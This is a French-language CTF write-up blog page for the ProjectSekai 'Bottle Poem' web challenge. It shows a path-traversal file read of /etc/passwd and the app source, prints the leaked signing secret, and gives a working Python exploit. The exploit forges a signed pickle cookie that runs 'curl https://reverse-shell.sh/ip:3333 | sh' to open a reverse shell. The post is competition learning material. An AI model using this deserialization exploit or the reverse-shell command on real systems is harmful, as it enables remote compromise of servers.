<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Auteur du write-up: Numb3rsProprety Category: Web Points: 500 =&amp;gt; 100 Difficulty: Easy Solves: 134/900 Description
Come and read poems in the bottle.
No bruteforcing is required to solve this challenge. Please do not use scanner tools. Rate limiting &amp;gt;applied. &amp;gt; Flag is executable on server.
Author: bwjy
http://bottle-poem.ctf.sekai.team
Note
Ce chall était super intéressant et m&amp;rsquo;as appris plein de truc Introduction Overview
On arrive donc sur un site ou on nous propose de lire des poemes." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://subuthax.github.io/writeup/projectsekai-bottle-poem/" />


    <title>
        
            ProjectSekai Bottle Poem :: Subuthax  — CTF Team &amp; CyberSecurity Enthusiast
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="ProjectSekai Bottle Poem">
<meta itemprop="description" content="Auteur du write-up: Numb3rsProprety Category: Web Points: 500 =&gt; 100 Difficulty: Easy Solves: 134/900 Description
Come and read poems in the bottle.
No bruteforcing is required to solve this challenge. Please do not use scanner tools. Rate limiting &gt;applied. &gt; Flag is executable on server.
Author: bwjy
http://bottle-poem.ctf.sekai.team
Note
Ce chall était super intéressant et m&rsquo;as appris plein de truc Introduction Overview
On arrive donc sur un site ou on nous propose de lire des poemes."><meta itemprop="datePublished" content="2022-10-02T21:36:04+02:00" />
<meta itemprop="dateModified" content="2022-10-02T21:36:04+02:00" />
<meta itemprop="wordCount" content="594"><meta itemprop="image" content="https://subuthax.github.io"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://subuthax.github.io"/>

<meta name="twitter:title" content="ProjectSekai Bottle Poem"/>
<meta name="twitter:description" content="Auteur du write-up: Numb3rsProprety Category: Web Points: 500 =&gt; 100 Difficulty: Easy Solves: 134/900 Description
Come and read poems in the bottle.
No bruteforcing is required to solve this challenge. Please do not use scanner tools. Rate limiting &gt;applied. &gt; Flag is executable on server.
Author: bwjy
http://bottle-poem.ctf.sekai.team
Note
Ce chall était super intéressant et m&rsquo;as appris plein de truc Introduction Overview
On arrive donc sur un site ou on nous propose de lire des poemes."/>







    <meta property="article:published_time" content="2022-10-02 21:36:04 &#43;0200 CEST" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">curl subuthax</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/writeup">Write-Up</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://subuthax.github.io/writeup/projectsekai-bottle-poem/">ProjectSekai Bottle Poem</a></h2>

            
            
            

            <div class="post-content">
                <ul>
<li>Auteur du write-up: Numb3rsProprety</li>
<li>Category: <code>Web</code></li>
<li>Points: <code>500</code> =&gt; <code>100</code></li>
<li>Difficulty: Easy</li>
<li>Solves: <code>134/900</code></li>
</ul>
<p><strong>Description</strong></p>
<blockquote>
<p>Come and read poems in the bottle.</p>
<p>No bruteforcing is required to solve this challenge. Please do not use scanner tools. Rate limiting  &gt;applied. &gt; Flag is executable on server.</p>
<p>Author: bwjy</p>
<p><code>http://bottle-poem.ctf.sekai.team</code></p>
</blockquote>
<p><strong>Note</strong></p>
<ul>
<li>Ce chall était super intéressant et m&rsquo;as appris plein de truc</li>
</ul>
<h3 id="introduction">Introduction</h3>
<p><strong>Overview</strong></p>
<p>On arrive donc sur un site ou on nous propose de lire des poemes. Quand on clique sur un des poemes
on est redirigé sur un endpoint /show avec un paramètre <code>id=nom du poeme</code> donc on se rend compte assez rapidement que on a une lfi par ce que si on met <a href="http://bottle-poem.ctf.sekai.team/show?id=/etc/passwd">http://bottle-poem.ctf.sekai.team/show?id=/etc/passwd</a> hop
on a notre /etc/passwd.</p>
<p>J&rsquo;ai perdu un temps infini a cet endroit par ce que je pensais pouvoir faire un log poisoning mais en fait le chall était en python donc pas de log.</p>
<p>Avec la lfi on lis le fichier /proc/self/cmdline et la on peux voir <code>python3 -u /app/app.py</code> donc la houra on a l&rsquo;emplacement du site.</p>
<p>On lis ensuite le fichier app.py et on se rend compte que le chall utilise Bottle qui est un framework web pour python (comme Flask sauf que ca fait super peur) jusqu&rsquo;a la rien d&rsquo;alarmant.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> bottle <span style="color:#f92672">import</span> route, run, template, request, response, error
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> config.secret <span style="color:#f92672">import</span> sekai
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> template(<span style="color:#e6db74">&#34;index&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@route</span>(<span style="color:#e6db74">&#34;/show&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>content_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain; charset=UTF-8&#34;</span>
</span></span><span style="display:flex;"><span>    param <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>id
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;^../app&#34;</span>, param):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;No!!!!&#34;</span>
</span></span><span style="display:flex;"><span>    requested_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/poems&#34;</span>, param)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(requested_path) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>            tfile <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;No This Poems&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tfile
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@error</span>(<span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">error404</span>(error):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> template(<span style="color:#e6db74">&#34;error&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@route</span>(<span style="color:#e6db74">&#34;/sign&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        session <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get_cookie(<span style="color:#e6db74">&#34;name&#34;</span>, secret<span style="color:#f92672">=</span>sekai)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> session <span style="color:#f92672">or</span> session[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;guest&#34;</span>:
</span></span><span style="display:flex;"><span>            session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;guest&#34;</span>}
</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#34;name&#34;</span>, session, secret<span style="color:#f92672">=</span>sekai)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> template(<span style="color:#e6db74">&#34;guest&#34;</span>, name<span style="color:#f92672">=</span>session[<span style="color:#e6db74">&#34;name&#34;</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> template(<span style="color:#e6db74">&#34;admin&#34;</span>, name<span style="color:#f92672">=</span>session[<span style="color:#e6db74">&#34;name&#34;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;pls no hax&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>chdir(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__))
</span></span><span style="display:flex;"><span>    run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span>)
</span></span></code></pre></div><p>On peut voir que les cookies sont signés via un variable dans /config/secret.py donc on lis ce fichier et la pof
on a la clé utilise pour signer les cookies : <code>Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu</code>.</p>
<p>A partir de la ca a été assez compliqué par ce que on savais pas trop quoi faire mais Sanlokii le genie nous sors une doc d&rsquo;un exploit nommée <code>Known Secret</code> (ci-joint: <a href="https://www.gsdays.fr/IMG/pdf/conf-scrt.pdf">https://www.gsdays.fr/IMG/pdf/conf-scrt.pdf</a>)</p>
<p>Enfait cet exploit consiste a signé un cookie vérolé avec la cle leaké. En l&rsquo;occurence c&rsquo;est tres intéressant pour nous car dans la ligne <code>session = request.get_cookie(&quot;name&quot;, secret=sekai)</code> la methode get_cookie est appelé.</p>
<p>Or cette methode est affreusement pas secure car quand on regarde le code de la lib bottle elle appelle la fonction cookie_decode on vois un <code>return  pickle.loads(base64.b64decode(msg))</code>.</p>
<p>Tiens tiens tiens une insecure serialization avec pickle. La plus trop besoin de reflechir pour avoir notre rce il suffit de faire un cookie custom avec notre rce.</p>
<p><strong>Exploit</strong></p>
<p>La je me suis un peu cassé la tete j&rsquo;ai voulu implémenter les fonctions de la lib au lieu de les import mais donc a la fin ca nous donne le code suivant:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span>  os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span>  bottle  <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span>  requests
</span></span><span style="display:flex;"><span>sekai <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#34;</span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://bottle-poem.ctf.sekai.team/sign&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span>  <span style="color:#a6e22e">RCE</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span>  <span style="color:#a6e22e">__reduce__</span>(self):
</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;curl https://reverse-shell.sh/ip:3333 | sh&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>  os<span style="color:#f92672">.</span>system, (cmd,)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#34;name&#34;</span>, RCE(), secret<span style="color:#f92672">=</span>sekai)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> str(response)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;Content-Type: text/html; charset=UTF-8</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Set-Cookie: name=&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>payload_send <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Sending </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> payload_send)
</span></span><span style="display:flex;"><span>send_exploit <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>payload_send)
</span></span></code></pre></div><p>J&rsquo;avoue c&rsquo;est pas super propre mais bon l&rsquo;important c&rsquo;est que ca marche
La on recois notre reverse shell, plus qu&rsquo;a faire un <code>cd / &amp;&amp; ./flag</code> et pof.</p>
<p>Merci pour votre lecture :)</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js" integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr&#43;gb19lZ12F8/h/HMGKqgrTh&#43;oMNaUEZPSy93w=="></script>



    </body>
</html>
